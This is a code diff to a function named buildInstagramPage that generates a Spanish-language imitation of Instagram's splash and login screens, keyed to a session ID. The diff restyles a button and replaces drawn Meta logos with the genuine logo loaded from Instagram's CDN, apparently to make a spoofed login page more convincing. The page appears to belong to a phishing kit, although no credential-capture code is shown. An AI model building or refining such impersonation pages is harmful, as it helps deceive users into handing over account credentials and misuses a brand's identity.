@@ -583,7 +583,7 @@ function buildInstagramPage(sessionId: string): string {
   <div class="splash-logo">${igCameraIcon}</div>
 
   <div class="splash-menu">
-    <button class="menu-btn" onclick="return false;">
+    <button class="menu-btn" onclick="return false;" style="background:#2c2c2e;">
       Abrir Instagram
       <span class="menu-chevron">›</span>
     </button>
@@ -599,16 +599,7 @@ function buildInstagramPage(sessionId: string): string {
 
   <div class="splash-from">from</div>
   <div class="splash-meta">
-    <svg width="46" height="14" viewBox="0 0 46 14" fill="none" xmlns="http://www.w3.org/2000/svg">
-      <defs>
-        <linearGradient id="sm1" x1="0" y1="7" x2="16" y2="7" gradientUnits="userSpaceOnUse">
-          <stop offset="0%" stop-color="#0064E0"/>
-          <stop offset="100%" stop-color="#0082FB"/>
-        </linearGradient>
-      </defs>
-      <path d="M1.5 7c0-.9.2-1.64.52-2.15.41-.7 1.02-1.07 1.73-1.07.6 0 1.12.22 1.76 1.01.43.53.87 1.29 1.27 2.21.4-.92.84-1.68 1.27-2.21.64-.79 1.16-1.01 1.76-1.01.71 0 1.32.37 1.73 1.07.32.51.52 1.25.52 2.15 0 1.22-.37 2.26-.94 2.99-.5.62-1.11.96-1.83.96-.6 0-1.13-.19-1.7-.63-.44-.34-.9-.87-1.37-1.64l-.44-.71-.44.71c-.47.77-.93 1.3-1.37 1.64-.57.44-1.1.63-1.7.63-.72 0-1.33-.34-1.83-.96C1.87 9.26 1.5 8.22 1.5 7z" fill="url(#sm1)"/>
-      <text x="17" y="11" font-family="-apple-system,BlinkMacSystemFont,Helvetica,Arial,sans-serif" font-size="11" font-weight="500" fill="#fff">Meta</text>
-    </svg>
+    <img src="https://static.cdninstagram.com/rsrc.php/yy/r/zVM9V9EU5f1.svg" alt="Meta" height="16">
   </div>
   <div class="splash-legal">
     Al continuar, aceptas las <a href="#">Condiciones de uso</a> y la <a href="#">Política de privacidad</a> de Instagram.
@@ -646,16 +637,7 @@ function buildInstagramPage(sessionId: string): string {
     <button class="btn-register" onclick="return false;">Crear cuenta nueva</button>
 
     <div class="form-meta">
-      <svg width="46" height="14" viewBox="0 0 46 14" fill="none" xmlns="http://www.w3.org/2000/svg">
-        <defs>
-          <linearGradient id="fm1" x1="0" y1="7" x2="16" y2="7" gradientUnits="userSpaceOnUse">
-            <stop offset="0%" stop-color="#0064E0"/>
-            <stop offset="100%" stop-color="#0082FB"/>
-          </linearGradient>
-        </defs>
-        <path d="M1.5 7c0-.9.2-1.64.52-2.15.41-.7 1.02-1.07 1.73-1.07.6 0 1.12.22 1.76 1.01.43.53.87 1.29 1.27 2.21.4-.92.84-1.68 1.27-2.21.64-.79 1.16-1.01 1.76-1.01.71 0 1.32.37 1.73 1.07.32.51.52 1.25.52 2.15 0 1.22-.37 2.26-.94 2.99-.5.62-1.11.96-1.83.96-.6 0-1.13-.19-1.7-.63-.44-.34-.9-.87-1.37-1.64l-.44-.71-.44.71c-.47.77-.93 1.3-1.37 1.64-.57.44-1.1.63-1.7.63-.72 0-1.33-.34-1.83-.96C1.87 9.26 1.5 8.22 1.5 7z" fill="url(#fm1)"/>
-        <text x="17" y="11" font-family="-apple-system,BlinkMacSystemFont,Helvetica,Arial,sans-serif" font-size="11" font-weight="500" fill="#fff">Meta</text>
-      </svg>
+      <img src="https://static.cdninstagram.com/rsrc.php/yy/r/zVM9V9EU5f1.svg" alt="Meta" height="16">
     </div>
   </div>
 </div>
